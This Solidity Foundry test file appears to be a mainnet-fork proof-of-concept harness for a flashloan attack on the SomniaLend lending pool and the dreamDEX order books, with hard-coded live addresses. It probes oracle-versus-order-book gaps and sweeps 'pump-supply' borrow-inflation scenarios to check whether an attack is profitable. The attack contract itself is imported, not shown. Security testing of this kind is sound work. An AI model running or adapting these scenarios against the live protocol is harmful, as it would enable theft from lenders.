// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {DexMath} from "../src/Interfaces.sol";
import {
    IAaveOracle,
    IDreamDexSpotPool,
    IERC20,
    ISomniaLendPool,
    SomniaConfigLib,
    SomniaMetrics
} from "../src/Interfaces.sol";
import {SomniaLendAttack} from "../src/SomniaLendAttack.sol";

/// @notice Pinned-fork harness for SomniaLend + dreamDEX.
///
/// Every scenario is zero-seed (no `deal`, no funding) unless the caller explicitly seeds a
/// scenario through `_seed`, which is only used by the control. Scenario results are written to
/// JSON whether the attack succeeds or reverts at repayment: a revert is a measured result, not
/// a lost data point.
contract SomniaLendEconomicPoCTest is Test {
    address internal constant POOL = 0xEC6758e6324c167DB39B6908036240460a2b0168;
    address internal constant ORACLE = 0x9b7B5d69a08071ce74C2f3D655038E3b782eAaFc;
    address internal constant WSOMI = 0x046EDe9564A72571df6F5e44d0405360c0f4dCab;
    address internal constant USDC = 0x28BEc7E30E6faee657a03e19Bf1128AaD7632A00;
    address internal constant WETH = 0x936Ab8C674bcb567CD5dEB85D8A216494704E9D8;
    address internal constant USDSO = 0x00000022dA000002656c64D9eA6011ea952D008A;
    address internal constant WBTC = 0xC5098b3cA516784323872F17235fa074E167D3D2;
    address internal constant NATIVE = 0x28f34DeFd2b4CB48d9eE6d89f2Be4Bc601694c00;

    address internal constant SOMI_USDSO = 0x035De7403eac6872787779CCA7CCF1b4CDb61379;
    address internal constant USDC_USDSO = 0x47fD2f18426f67106DBaC82F6d21D446c5F2120b;
    address internal constant WETH_USDSO = 0xa936da11B57b50A344e1293AAaE5232885ea2bDE;
    address internal constant WBTC_USDSO = 0x25bfF6B7B5E2243424F38E75de7ab03C0522a5EA;

    // dreamDEX SpotPool proxies resolve their implementation through this reader. The address is
    // the low 20 bytes of the PUSH32 word in the deployed proxy runtime, verified from bytecode.
    address internal constant DEX_PROXY_READER = 0x55790554C0d6914edb90F8d05B2f0bBc85605026;
    bytes32 internal constant EIP1967_IMPLEMENTATION =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    uint256 internal forkBlock;
    uint256 internal buyLimitBps;
    uint256 internal sellLimitBps;
    uint256 internal exitLimitBps;
    uint256 internal borrowBps;
    bool internal borrowAll;
    bool internal exitBorrowed;
    bool internal expectProfitable;

    function setUp() public {
        forkBlock = vm.envUint("SOMNIA_FORK_BLOCK");
        require(forkBlock > 0, "pin SOMNIA_FORK_BLOCK");
        // Somnia RPC rejects EIP-1898 block objects, which Forge >= 1.8 sends on every fork read.
        // This harness therefore requires Forge <= 1.7.x (foundryup -v 1.7.1).
        vm.createSelectFork(vm.envString("SOMNIA_RPC_URL"), forkBlock);
        require(block.chainid == 5031, "not Somnia mainnet");
        require(block.number == forkBlock, "fork block mismatch");

        buyLimitBps = vm.envOr("DEX_BUY_LIMIT_BPS", uint256(10_050));
        sellLimitBps = vm.envOr("DEX_SELL_LIMIT_BPS", uint256(9_950));
        exitLimitBps = vm.envOr("DEX_EXIT_LIMIT_BPS", uint256(9_950));
        borrowBps = vm.envOr("BORROW_BPS", uint256(10_000));
        borrowAll = vm.envOr("BORROW_ALL_OPPOSITE_RESERVES", false);
        exitBorrowed = vm.envOr("EXIT_BORROWED_ASSET", true);
        expectProfitable = vm.envOr("EXPECT_PROFITABLE", false);
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Recon
    // ─────────────────────────────────────────────────────────────────────────────

    function test_recon_exact_live_configuration() public view {
        console2.log("fork block", block.number);
        console2.log("pool implementation", address(uint160(uint256(vm.load(POOL, EIP1967_IMPLEMENTATION)))));
        console2.log("oracle", ORACLE);
        console2.log("oracle base currency", IAaveOracle(ORACLE).BASE_CURRENCY());
        console2.log("oracle base unit", IAaveOracle(ORACLE).BASE_CURRENCY_UNIT());
        console2.log("oracle fallback", IAaveOracle(ORACLE).getFallbackOracle());
        console2.log("flash premium bps", ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL());

        address[] memory reserves = ISomniaLendPool(POOL).getReservesList();
        console2.log("reserve count", reserves.length);
        require(reserves.length >= 2, "reserve list unavailable");

        for (uint256 i; i < reserves.length; ++i) {
            if (reserves[i].code.length == 0) {
                console2.log("reserve is not a contract, skipping", reserves[i]);
                continue;
            }
            _logReserve(reserves[i]);
        }
        console2.log("flash premium bps", ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL());

        _logMarket("SOMI/USDso", SOMI_USDSO);
        _logMarket("USDC.e/USDso", USDC_USDSO);
        _logMarket("WETH/USDso", WETH_USDSO);
        _logMarket("WBTC/USDso", WBTC_USDSO);

        // The decisive pre-trade number: how much cheaper the CLOB asks are than the price the
        // protocol is willing to lend against. Buy at the ask, supply at the oracle; the gap is
        // the free edge, and it must exceed (1+premium)/LTV - 1 to make the flashloan self-funding.
        _logBasis("SOMI/USDso", SOMI_USDSO);
        _logBasis("USDC.e/USDso", USDC_USDSO);
        _logBasis("WETH/USDso", WETH_USDSO);
        _logBasis("WBTC/USDso", WBTC_USDSO);

        (bool ok, bytes memory data) = DEX_PROXY_READER.staticcall(abi.encodeWithSignature("implementation()"));
        require(ok && data.length >= 32, "DEX implementation read failed");
        console2.log("SOMI SpotPool implementation", abi.decode(data, (address)));

        // Harness integrity: the two markets under test must be populated and priced.
        require(IAaveOracle(ORACLE).getAssetPrice(WSOMI) > 0, "no SOMI oracle price");
        require(IAaveOracle(ORACLE).getAssetPrice(USDSO) > 0, "no USDso oracle price");
        require(IAaveOracle(ORACLE).getAssetPrice(USDC) > 0, "no USDC oracle price");
        require(_best(SOMI_USDSO, false) > 0, "empty SOMI ask book");
        require(_best(USDC_USDSO, true) > 0, "empty USDC bid book");

        _logDepth("SOMI/USDso", SOMI_USDSO);
        _logDepth("USDC.e/USDso", USDC_USDSO);
        _logDepth("WETH/USDso", WETH_USDSO);
        _logDepth("WBTC/USDso", WBTC_USDSO);

        // What an attack would have to beat, computed from live state only.
        _logThreshold("WSOMI", WSOMI);
        _logThreshold("USDso", USDSO);
        _logThreshold("USDC.e", USDC);
        _logThreshold("WETH", WETH);
        _logThreshold("WBTC", WBTC);
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Control: flashloan without a trade must not move the oracle
    // ─────────────────────────────────────────────────────────────────────────────

    function test_control_no_trade_no_oracle_delta() public {
        uint256 amount = vm.envOr("CONTROL_FLASH_USDSO", uint256(1_000e18));
        uint256 premium = (amount * ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL()) / 10_000;

        SomniaLendAttack attacker = new SomniaLendAttack(SomniaConfigLib.mainnet());
        // The control must repay a premium it never earned; this seed is logged and excluded from
        // the "attack" accounting. It is not an exploit input.
        deal(USDSO, address(attacker), premium);
        attacker.declareSeed(USDSO, premium);

        uint256 somiBefore = IAaveOracle(ORACLE).getAssetPrice(WSOMI);
        uint256 usdsoBefore = IAaveOracle(ORACLE).getAssetPrice(USDSO);
        uint256 usdcBefore = IAaveOracle(ORACLE).getAssetPrice(USDC);

        attacker.runControl(USDSO, amount);

        SomniaMetrics memory m = attacker.metrics();
        assertEq(IAaveOracle(ORACLE).getAssetPrice(WSOMI), somiBefore, "control moved SOMI");
        assertEq(IAaveOracle(ORACLE).getAssetPrice(USDSO), usdsoBefore, "control moved USDso");
        assertEq(IAaveOracle(ORACLE).getAssetPrice(USDC), usdcBefore, "control moved USDC");
        assertEq(m.preTradeBaseTraded, 0, "control traded");
        assertEq(m.totalDebtBase, 0, "control borrowed");
        assertTrue(m.repaid, "control did not repay");

        _write("control", m, "repaid", 0, 0);
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Sweep: every atomic direction at several notional sizes
    // ─────────────────────────────────────────────────────────────────────────────

    function test_sweep_atomic_directions() public {
        uint256[4] memory somiSizes = [
            vm.envOr("SOMI_SWEEP_1", uint256(100e18)),
            vm.envOr("SOMI_SWEEP_2", uint256(5_000e18)),
            vm.envOr("SOMI_SWEEP_3", uint256(25_000e18)),
            vm.envOr("SOMI_SWEEP_4", uint256(100_000e18))
        ];
        uint256[4] memory usdcSizes = [
            vm.envOr("USDC_SWEEP_1", uint256(25e6)),
            vm.envOr("USDC_SWEEP_2", uint256(1_000e6)),
            vm.envOr("USDC_SWEEP_3", uint256(3_000e6)),
            vm.envOr("USDC_SWEEP_4", uint256(6_000e6))
        ];

        bool anyProfitable;

        for (uint256 i; i < somiSizes.length; ++i) {
            if (somiSizes[i] == 0) continue;
            uint256 snap = vm.snapshot();
            (SomniaMetrics memory m, bool ok, string memory outcome) =
                _runSomiPump(somiSizes[i]);
            _report("somi-pump-supply", somiSizes[i], m, ok, outcome);
            if (_profitable(m)) anyProfitable = true;
            vm.revertTo(snap);
        }

        for (uint256 i; i < usdcSizes.length; ++i) {
            if (usdcSizes[i] == 0) continue;
            uint256 snap = vm.snapshot();
            (SomniaMetrics memory m, bool ok, string memory outcome) =
                _runUsdsoPump(usdcSizes[i]);
            _report("usdso-pump-supply", usdcSizes[i], m, ok, outcome);
            if (_profitable(m)) anyProfitable = true;
            vm.revertTo(snap);
        }

        console2.log("======== SUMMARY ========");
        console2.log("ANY PROFITABLE ATOMIC ZERO-SEED PATH", anyProfitable);
        if (expectProfitable) require(anyProfitable, "no profitable atomic path at pinned block");
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Scenario drivers
    // ─────────────────────────────────────────────────────────────────────────────

    function _runSomiPump(uint256 amount)
        internal
        returns (SomniaMetrics memory m, bool ok, string memory outcome)
    {
        SomniaLendAttack attacker = new SomniaLendAttack(SomniaConfigLib.mainnet());
        SomniaLendAttack.Params memory p = SomniaLendAttack.Params({
            buyLimitBps: buyLimitBps,
            sellLimitBps: exitLimitBps,
            borrowBps: borrowBps,
            borrowAll: borrowAll,
            exitBorrowed: exitBorrowed
        });
        try attacker.runSomiPumpSupply(amount, p) {
            m = attacker.metrics();
            ok = true;
            outcome = "repaid";
        } catch (bytes memory reason) {
            m = _decode(reason);
            outcome = _reason(reason);
        }
    }

    function _runUsdsoPump(uint256 amount)
        internal
        returns (SomniaMetrics memory m, bool ok, string memory outcome)
    {
        SomniaLendAttack attacker = new SomniaLendAttack(SomniaConfigLib.mainnet());
        SomniaLendAttack.Params memory p = SomniaLendAttack.Params({
            buyLimitBps: buyLimitBps,
            sellLimitBps: sellLimitBps,
            borrowBps: borrowBps,
            borrowAll: borrowAll,
            exitBorrowed: exitBorrowed
        });
        try attacker.runUsdsoPumpSupply(amount, p) {
            m = attacker.metrics();
            ok = true;
            outcome = "repaid";
        } catch (bytes memory reason) {
            m = _decode(reason);
            outcome = _reason(reason);
        }
    }

    /// @dev A path is only profitable if it repaid the flashloan and kept a strictly positive
    ///      liquid USDso balance, with no residual debt-asset liability in the wallet.
    function _profitable(SomniaMetrics memory m) internal pure returns (bool) {
        if (!m.repaid) return false;
        if (!m.zeroSeed) return false;
        return m.attackerLiquidBase > m.seededBase;
    }

    function _moveBps(uint256 before, uint256 after_) internal pure returns (uint256) {
        if (before == 0 || after_ <= before) return 0;
        return ((after_ - before) * 10_000) / before;
    }

    function _decode(bytes memory reason) internal pure returns (SomniaMetrics memory m) {
        if (reason.length < 4) return m;
        bytes4 sel;
        assembly {
            sel := mload(add(reason, 32))
        }
        if (sel != SomniaLendAttack.Shortfall.selector && sel != SomniaLendAttack.Aborted.selector) return m;
        bytes memory body = _strip(reason);
        if (sel == SomniaLendAttack.Shortfall.selector) {
            return abi.decode(abi.decode(body, (bytes)), (SomniaMetrics));
        }
        (bytes memory payload,) = abi.decode(body, (bytes, bytes));
        return abi.decode(payload, (SomniaMetrics));
    }

    function _strip(bytes memory data) internal pure returns (bytes memory out) {
        out = new bytes(data.length - 4);
        for (uint256 i; i < out.length; ++i) out[i] = data[i + 4];
    }

    /// @dev Human-readable outcome, including which leg failed. This is what makes a barren fork
    ///      run diagnostic instead of silent.
    function _reason(bytes memory reason) internal pure returns (string memory) {
        if (reason.length < 4) return "revert";
        bytes4 sel;
        assembly {
            sel := mload(add(reason, 32))
        }
        bytes memory body = _strip(reason);
        if (sel == SomniaLendAttack.Shortfall.selector) return "repayment-shortfall";
        if (sel == SomniaLendAttack.Aborted.selector) {
            (, bytes memory inner) = abi.decode(body, (bytes, bytes));
            return string.concat("aborted:", _message(inner), " sel=", _hex4(inner));
        }
        return _message(reason);
    }

    function _hex4(bytes memory reason) internal pure returns (string memory) {
        if (reason.length < 4) return "0x00000000";
        bytes memory out = new bytes(10);
        out[0] = "0";
        out[1] = "x";
        bytes16 hexDigits = "0123456789abcdef";
        for (uint256 i; i < 4; ++i) {
            uint8 b = uint8(reason[i]);
            out[2 + i * 2] = hexDigits[b >> 4];
            out[3 + i * 2] = hexDigits[b & 0x0f];
        }
        return string(out);
    }

    function _message(bytes memory reason) internal pure returns (string memory) {
        if (reason.length < 4) return "empty";
        bytes4 sel;
        assembly {
            sel := mload(add(reason, 32))
        }
        if (sel != 0x08c379a0) return "custom-error";
        return abi.decode(_strip(reason), (string));
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Reporting
    // ─────────────────────────────────────────────────────────────────────────────

    function _report(string memory name, uint256 amount, SomniaMetrics memory m, bool ok, string memory outcome)
        internal
    {
        console2.log("---------- scenario", name, amount);
        console2.log("  outcome", outcome);
        console2.log("  pre-trade base traded", m.preTradeBaseTraded);
        console2.log("  pre-trade quote traded", m.preTradeQuoteTraded);
        console2.log("  pre-trade exec price", m.preTradeExecPrice);
        console2.log("  oracle collateral before", m.collateralOracleBefore);
        console2.log("  oracle collateral after", m.collateralOracleAfter);
        console2.log("  oracle debt before", m.debtOracleBefore);
        console2.log("  oracle debt after", m.debtOracleAfter);
        console2.log("  best bid before/after", m.bestBidBefore, m.bestBidAfter);
        console2.log("  best ask before/after", m.bestAskBefore, m.bestAskAfter);
        console2.log("  supplied", m.suppliedCollateral);
        console2.log("  ltv bps", m.ltvBps);
        console2.log("  baseline borrow base", m.baselineBorrowPowerBase);
        console2.log("  actual borrow base", m.postSupplyAvailableBorrowsBase);
        console2.log("  borrowed USDso", m.borrowUsdso);
        console2.log("  borrowed USDC", m.borrowUsdc);
        console2.log("  borrowed WETH", m.borrowWeth);
        console2.log("  borrowed WBTC", m.borrowWbtc);
        console2.log("  borrowed WSOMI", m.borrowWsomi);
        console2.log("  exit base sold", m.exitBaseSold);
        console2.log("  exit USDso proceeds", m.exitQuoteProceeds);
        console2.log("  final USDso", m.finalUsdso);
        console2.log("  final USDC", m.finalUsdc);
        console2.log("  debt base", m.totalDebtBase);
        console2.log("  collateral base", m.totalCollateralBase);
        console2.log("  health factor", m.healthFactor);
        console2.log("  unspent flash principal", m.unspentFlashAsset);
        console2.log("  repayment base", m.repaymentBase);
        console2.log("  COVERAGE bps", m.coverageBps);
        console2.log("  UNIT EDGE bps", m.unitEdgeBps);
        console2.log("  EDGE REQUIRED bps", m.edgeRequiredBps);
        console2.log("  borrow power inflation base", m.borrowPowerInflationBase);
        console2.log("  MAX NET ATOMIC base", m.maxNetBase);
        console2.log("  BREAKEVEN LTV bps", m.breakevenLtvBps);
        console2.log("  bad debt base", m.badDebtBase);
        console2.log("  attacker liquid value base", m.attackerLiquidBase);
        console2.log("  seeded base (0 = zero-seed)", m.seededBase);
        console2.log("  step failures", m.stepFailures);
        console2.log("  last error step", m.lastErrorStep);
        console2.log("  last error selector", uint32(m.lastErrorSelector));
        console2.log("  shortfall (flash asset units)", m.shortfallFlashAsset);
        console2.log("  shortfall (base units)", m.shortfallBase);
        console2.log("  repaid", m.repaid);
        console2.log("  PROFITABLE", _profitable(m));

        _write(name, m, outcome, amount, ok ? 1 : 0);
    }

    function _write(string memory name, SomniaMetrics memory m, string memory outcome, uint256 amount, uint256 ok)
        internal
    {
        string memory key = "result";
        string memory json = vm.serializeUint(key, "forkBlock", forkBlock);
        json = vm.serializeString(key, "scenario", name);
        json = vm.serializeString(key, "outcome", outcome);
        json = vm.serializeUint(key, "repaid", m.repaid ? 1 : 0);
        json = vm.serializeUint(key, "callSucceeded", ok);
        json = vm.serializeUint(key, "requestedNotional", amount);
        json = vm.serializeUint(key, "flashAmount", m.flashAmount);
        json = vm.serializeUint(key, "flashPremium", m.flashPremium);
        json = vm.serializeUint(key, "flashRepayment", m.flashRepayment);
        json = vm.serializeUint(key, "suppliedCollateral", m.suppliedCollateral);
        json = vm.serializeUint(key, "ltvBps", m.ltvBps);
        json = vm.serializeUint(key, "collateralOracleBefore", m.collateralOracleBefore);
        json = vm.serializeUint(key, "collateralOracleAfter", m.collateralOracleAfter);
        json = vm.serializeUint(key, "debtOracleBefore", m.debtOracleBefore);
        json = vm.serializeUint(key, "debtOracleAfter", m.debtOracleAfter);
        json = vm.serializeInt(key, "collateralFeedAnswerBefore", m.collateralFeedAnswerBefore);
        json = vm.serializeInt(key, "collateralFeedAnswerAfter", m.collateralFeedAnswerAfter);
        json = vm.serializeUint(key, "collateralFeedUpdatedAtBefore", m.collateralFeedUpdatedAtBefore);
        json = vm.serializeUint(key, "collateralFeedUpdatedAtAfter", m.collateralFeedUpdatedAtAfter);
        json = vm.serializeUint(key, "bestBidBefore", m.bestBidBefore);
        json = vm.serializeUint(key, "bestAskBefore", m.bestAskBefore);
        json = vm.serializeUint(key, "bestBidAfter", m.bestBidAfter);
        json = vm.serializeUint(key, "bestAskAfter", m.bestAskAfter);
        json = vm.serializeUint(key, "preTradeBaseTraded", m.preTradeBaseTraded);
        json = vm.serializeUint(key, "preTradeQuoteTraded", m.preTradeQuoteTraded);
        json = vm.serializeUint(key, "preTradeExecPrice", m.preTradeExecPrice);
        json = vm.serializeUint(key, "baselineBorrowPowerBase", m.baselineBorrowPowerBase);
        json = vm.serializeUint(key, "postSupplyAvailableBorrowsBase", m.postSupplyAvailableBorrowsBase);
        json = vm.serializeUint(key, "borrowUsdso", m.borrowUsdso);
        json = vm.serializeUint(key, "borrowUsdc", m.borrowUsdc);
        json = vm.serializeUint(key, "borrowWeth", m.borrowWeth);
        json = vm.serializeUint(key, "borrowWbtc", m.borrowWbtc);
        json = vm.serializeUint(key, "borrowWsomi", m.borrowWsomi);
        json = vm.serializeUint(key, "exitBaseSold", m.exitBaseSold);
        json = vm.serializeUint(key, "exitQuoteProceeds", m.exitQuoteProceeds);
        json = vm.serializeUint(key, "exitExecPrice", m.exitExecPrice);
        json = vm.serializeUint(key, "totalCollateralBase", m.totalCollateralBase);
        json = vm.serializeUint(key, "totalDebtBase", m.totalDebtBase);
        json = vm.serializeUint(key, "healthFactor", m.healthFactor);
        json = vm.serializeUint(key, "finalUsdso", m.finalUsdso);
        json = vm.serializeUint(key, "finalUsdc", m.finalUsdc);
        json = vm.serializeUint(key, "finalWeth", m.finalWeth);
        json = vm.serializeUint(key, "finalWbtc", m.finalWbtc);
        json = vm.serializeUint(key, "finalNative", m.finalNative);
        json = vm.serializeUint(key, "finalWsomi", m.finalWsomi);
        json = vm.serializeUint(key, "unspentFlashAsset", m.unspentFlashAsset);
        json = vm.serializeUint(key, "repaymentBase", m.repaymentBase);
        json = vm.serializeUint(key, "coverageBps", m.coverageBps);
        json = vm.serializeInt(key, "unitEdgeBps", m.unitEdgeBps);
        json = vm.serializeUint(key, "premiumBps", m.premiumBps);
        json = vm.serializeUint(key, "edgeRequiredBps", m.edgeRequiredBps);
        json = vm.serializeInt(key, "borrowPowerInflationBase", m.borrowPowerInflationBase);
        json = vm.serializeInt(key, "maxNetBase", m.maxNetBase);
        json = vm.serializeUint(key, "breakevenLtvBps", m.breakevenLtvBps);
        json = vm.serializeUint(key, "liquidationThresholdBps", m.liquidationThresholdBps);
        json = vm.serializeInt(key, "badDebtBase", m.badDebtBase);
        json = vm.serializeUint(key, "attackerLiquidBase", m.attackerLiquidBase);
        json = vm.serializeUint(key, "seededBase", m.seededBase);
        json = vm.serializeUint(key, "zeroSeed", m.zeroSeed ? 1 : 0);
        json = vm.serializeUint(key, "stepFailures", m.stepFailures);
        json = vm.serializeUint(key, "lastErrorStep", m.lastErrorStep);
        json = vm.serializeUint(key, "lastErrorSelector", uint32(m.lastErrorSelector));
        json = vm.serializeUint(key, "shortfallFlashAsset", m.shortfallFlashAsset);
        json = vm.serializeUint(key, "shortfallBase", m.shortfallBase);
        json = vm.serializeUint(key, "oracleRereadCount", m.oracleRereadCount);
        json = vm.serializeUint(key, "oracleMoveBps", _moveBps(m.collateralOracleBefore, m.collateralOracleAfter));
        json = vm.serializeUint(key, "dexAskMoveBps", _moveBps(m.bestAskBefore, m.bestAskAfter));
        json = vm.serializeUint(key, "dexBidMoveBps", _moveBps(m.bestBidBefore, m.bestBidAfter));
        json = vm.serializeUint(key, "profitable", _profitable(m) ? 1 : 0);
        vm.writeJson(json, string.concat("results/", name, "-", vm.toString(amount), ".json"));
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Recon helpers
    // ─────────────────────────────────────────────────────────────────────────────

    function _logReserve(address asset) internal view {
        console2.log("--- reserve", asset);
        console2.log("  decimals", IERC20(asset).decimals());
        console2.log("  oracle price", IAaveOracle(ORACLE).getAssetPrice(asset));
        console2.log("  config raw", _configRaw(asset));

        address source = IAaveOracle(ORACLE).getSourceOfAsset(asset);
        console2.log("  source", source);
        console2.log("  source code size", source.code.length);
        if (source != address(0)) {
            console2.log("  source impl", address(uint160(uint256(vm.load(source, EIP1967_IMPLEMENTATION)))));
            (bool ok, bytes memory data) = source.staticcall(abi.encodeWithSignature("latestRoundData()"));
            if (ok && data.length >= 160) {
                (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt,) =
                    abi.decode(data, (uint80, int256, uint256, uint256, uint80));
                console2.log("  feed round", roundId);
                console2.log("  feed answer", answer);
                console2.log("  feed startedAt", startedAt);
                console2.log("  feed updatedAt", updatedAt);
                console2.log("  chain timestamp", block.timestamp);
            } else {
                console2.log("  feed latestRoundData failed, data length", data.length);
            }
        }

        // Reserve liquidity, discovered without trusting the V3 struct layout: probe the pool for
        // a wrapper that proves it belongs to this asset, then read that wrapper's balance.
        (address aToken, bool known) = _aTokenOf(asset);
        if (known) {
            console2.log("  aToken", aToken);
            console2.log("  aToken underlying cash", IERC20(asset).balanceOf(aToken));
            console2.log("  aToken shares", IERC20(aToken).totalSupply());
        } else {
            console2.log("  aToken NOT resolved by either route");
        }
    }

    /// @dev How much notional is needed to walk the book by a given amount. This is the number
    ///      that decides whether any oracle/DEX gap is reachable with borrowed money at all: if a
    ///      10% walk costs more than the collateral gap can repay, no size works.
    function _logDepth(string memory label, address pool) internal view {
        (address base, address quote,,,,,) = IDreamDexSpotPool(pool).getPoolParams();
        console2.log("--- depth", label);
        uint8 baseDec = base == NATIVE ? 18 : IERC20(base).decimals();
        uint8 quoteDec = IERC20(quote).decimals();

        for (uint64 n = 1; n <= 20; n += 3) {
            IDreamDexSpotPool.BookLevel[] memory asks = IDreamDexSpotPool(pool).getBookLevels(false, n);
            if (asks.length == 0) {
                console2.log("  asks: empty at level", n);
                break;
            }
            uint256 worst = asks[asks.length - 1].price;
            uint256 best = asks[0].price;
            uint256 notional;
            for (uint256 i; i < asks.length; ++i) {
                notional += DexMath.quoteForBase(asks[i].price, asks[i].quantity, baseDec, quoteDec);
            }
            console2.log("  ask levels", asks.length);
            console2.log("    worst ask", worst);
            console2.log("    walk bps", ((worst - best) * 10_000) / best);
            console2.log("    cumulative quote needed", notional);
            if (asks.length < n) break;
        }

        for (uint64 n = 1; n <= 20; n += 3) {
            IDreamDexSpotPool.BookLevel[] memory bids = IDreamDexSpotPool(pool).getBookLevels(true, n);
            if (bids.length == 0) {
                console2.log("  bids: empty at level", n);
                break;
            }
            uint256 worst = bids[bids.length - 1].price;
            uint256 best = bids[0].price;
            uint256 notional;
            for (uint256 i; i < bids.length; ++i) {
                notional += DexMath.quoteForBase(bids[i].price, bids[i].quantity, baseDec, quoteDec);
            }
            console2.log("  bid levels", bids.length);
            console2.log("    worst bid", worst);
            console2.log("    walk down bps", ((best - worst) * 10_000) / best);
            console2.log("    cumulative quote available", notional);
            if (bids.length < n) break;
        }
    }

    /// @dev The number that decides feasibility before any trade is attempted:
    ///      edge = (1 + flashPremium) / LTV - 1.
    function _logThreshold(string memory symbol, address asset) internal view {
        uint256 cfg = _configRaw(asset);
        uint256 ltv = cfg & 0xffff;
        uint256 threshold = (cfg >> 16) & 0xffff;
        uint256 premium = ISomniaLendPool(POOL).FLASHLOAN_PREMIUM_TOTAL();
        console2.log("--- feasibility", symbol);
        console2.log("  ltv bps", ltv);
        console2.log("  liquidation threshold bps", threshold);
        console2.log("  edge required bps", ltv == 0 ? type(uint256).max : ((10_000 + premium) * 10_000) / ltv - 10_000);
    }

    function _configRaw(address asset) internal view returns (uint256) {
        (bool ok, bytes memory data) = POOL.staticcall(abi.encodeWithSignature("getConfiguration(address)", asset));
        return ok && data.length >= 32 ? abi.decode(data, (uint256)) : 0;
    }

    function _aTokenOf(address asset) internal view returns (address, bool) {
        (bool ok, bytes memory data) = POOL.staticcall(abi.encodeWithSignature("getReserveAToken(address)", asset));
        if (ok && data.length >= 32) {
            address candidate = abi.decode(data, (address));
            if (_underlyingOf(candidate) == asset) return (candidate, true);
        }
        (ok, data) = POOL.staticcall(abi.encodeWithSignature("getReserveData(address)", asset));
        if (ok && data.length >= 32) {
            for (uint256 i; i + 32 <= data.length; i += 32) {
                address candidate = address(uint160(uint256(_word(data, i))));
                if (_underlyingOf(candidate) == asset) return (candidate, true);
            }
        }
        return (address(0), false);
    }

    function _underlyingOf(address token) internal view returns (address underlying) {
        if (token == address(0) || token.code.length == 0) return address(0);
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("UNDERLYING_ASSET_ADDRESS()"));
        if (ok && data.length >= 32) underlying = abi.decode(data, (address));
    }

    function _word(bytes memory data, uint256 offset) internal pure returns (uint256 out) {
        assembly {
            out := mload(add(add(data, 32), offset))
        }
    }

    function _logMarket(string memory label, address pool) internal view {
        (address base, address quote, uint256 makerFee, uint256 takerFee, uint256 tick, uint256 minQty, uint256 lot) =
            IDreamDexSpotPool(pool).getPoolParams();
        console2.log("--- market", label);
        console2.log("  pool", pool);
        console2.log("  base", base);
        console2.log("  quote", quote);
        console2.log("  maker fee bps*1k", makerFee);
        console2.log("  taker fee bps*1k", takerFee);
        console2.log("  tick", tick);
        console2.log("  min quantity", minQty);
        console2.log("  lot", lot);
        console2.log("  best bid", _best(pool, true));
        console2.log("  best ask", _best(pool, false));
    }

    /// @notice Real, quote-backed basis: ask what the CLOB would pull for one minimum lot on the
    ///         bid side, then value both legs with the Pool's own oracle. Positive basis means the
    ///         protocol values the purchased collateral above what the CLOB charges for it.
    function _logBasis(string memory label, address pool) internal view {
        (address base, address quote,,,, uint256 minQty,) = IDreamDexSpotPool(pool).getPoolParams();
        uint256 ask = _best(pool, false);
        uint256 bid = _best(pool, true);
        console2.log("--- basis", label);
        console2.log("  base", base);
        console2.log("  quote", quote);
        (bool baseOk, uint256 basePx) = _price(base);
        (bool quoteOk, uint256 quotePx) = _price(quote);
        console2.log("  oracle base ok", baseOk ? 1 : 0);
        console2.log("  oracle base", basePx);
        console2.log("  oracle quote ok", quoteOk ? 1 : 0);
        console2.log("  oracle quote", quotePx);

        if (ask > 0 && minQty > 0) {
            (bool ok, address input, uint256 required) = _autoPull(pool, true, ask, minQty);
            if (ok && input == quote && required > 0) {
                console2.log("  buy 1 minQty: quote cost", required);
                console2.log("  buy static basis bps", _edgeBps(base, quote, minQty, required));
            } else {
                console2.log("  buy probe unavailable");
            }
        }
        if (bid > 0 && minQty > 0) {
            (bool ok, address input, uint256 required) = _autoPull(pool, false, bid, minQty);
            if (ok && input == base && required > 0) {
                console2.log("  sell 1 minQty: base provided", required);
                console2.log("  sell static basis bps", _edgeBps(base, quote, required, minQty));
            } else {
                console2.log("  sell probe unavailable");
            }
        }
    }

    /// @dev Never trusts the oracle to answer for a non-reserve; returns ok=false instead of
    ///      reverting the whole recon run.
    function _price(address asset) internal view returns (bool ok, uint256 price) {
        address priced = (asset == NATIVE || asset == address(0)) ? WSOMI : asset;
        bytes memory data;
        (ok, data) = ORACLE.staticcall(abi.encodeWithSelector(IAaveOracle.getAssetPrice.selector, priced));
        if (ok && data.length >= 32) price = abi.decode(data, (uint256));
        else ok = false;
    }

    /// @dev `getAutoPullRequirement` reverts for accounts with no vault on the real deployment, so
    ///      recon must tolerate a failure instead of losing the whole run to it.
    function _autoPull(address pool, bool isBid, uint256 price, uint256 quantity)
        internal
        view
        returns (bool ok, address input, uint256 required)
    {
        bytes memory call_ = abi.encodeWithSelector(
            IDreamDexSpotPool.getAutoPullRequirement.selector, address(this), isBid, price, quantity, uint96(0)
        );
        bytes memory data;
        (ok, data) = pool.staticcall(call_);
        if (ok && data.length >= 96) (input, required,) = abi.decode(data, (address, uint256, uint256));
        else ok = false;
    }

    /// @dev Signed basis in bps between the oracle's value of `baseAmount` of `base` and the
    ///      oracle's value of `quoteAmount` of `quote`, both in the Pool's base currency.
    function _edgeBps(address base, address quote, uint256 baseAmount, uint256 quoteAmount)
        internal
        view
        returns (int256)
    {
        (bool ok, uint256 baseValue) = _value(base, baseAmount);
        (bool ok2, uint256 quoteValue) = _value(quote, quoteAmount);
        if (!ok || !ok2 || quoteValue == 0) return 0;
        return int256((baseValue * 10_000) / quoteValue) - 10_000;
    }

    /// @dev Native SOMI is the CLOB sentinel, not a reserve, so it has no oracle entry of its own.
    ///      It is the base asset of SOMI/USDso and inherits WSOMI's published price.
    function _value(address asset, uint256 amount)
        internal
        view
        returns (bool ok, uint256 baseValue)
    {
        if (amount == 0) return (true, 0);
        address priced = (asset == NATIVE || asset == address(0)) ? WSOMI : asset;
        uint256 price = IAaveOracle(ORACLE).getAssetPrice(priced);
